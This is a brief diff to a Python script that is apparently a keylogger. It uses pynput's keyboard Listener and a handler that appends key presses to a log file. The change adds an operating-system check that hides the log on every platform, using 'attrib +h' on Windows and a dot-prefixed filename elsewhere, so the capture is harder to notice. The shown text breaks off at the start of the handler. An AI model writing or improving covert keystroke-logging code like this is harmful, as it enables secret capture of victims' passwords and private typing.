@@ -1,9 +1,14 @@
 import os
 from pynput.keyboard import Listener, Key
+import platform
 
-arq = "key.txt"
-open(arq, "w")
-os.system(f"attrib +h {arq}")
+if platform.system() == "Windows":
+    arq = "key.txt"
+    open(arq, "w").close()
+    os.system(f"attrib +h {arq}")
+else:
+    arq = ".key.txt"
+    open(arq, "w").close()
 
 def pressionada(key):
     with open(arq, "a") as arquivo:
